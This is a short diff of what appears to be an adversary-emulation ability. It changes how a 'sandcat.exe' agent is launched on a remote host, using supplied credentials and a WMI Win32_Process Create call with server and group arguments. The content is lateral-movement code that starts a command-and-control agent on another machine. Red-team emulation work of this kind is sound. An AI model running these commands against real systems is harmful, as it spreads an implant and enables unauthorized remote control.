@@ -15,8 +15,10 @@
         $secstr = New-Object -TypeName System.Security.SecureString;
         $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};
         $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;
-        $File = [System.IO.File]::ReadAllBytes("#{files}\sandcat.exe");
         $session = New-PSSession -ComputerName #{remote.host.name} -Credential $cred;
-        -Command {Invoke-Command -ComputerName #{remote.host.ip} Start-Process -FilePath C:\Users\Public\sandcat.exe -ArgumentList "#{server} #{group}"}
+        Invoke-WmiMethod -ComputerName #{remote.host.name} -Class Win32_Process -Name Create -ArgumentList "C:\Users\Public\sandcat.exe #{server} #{group}" -Credential $cred
+
+
 
       payload: sandcat.exe
+
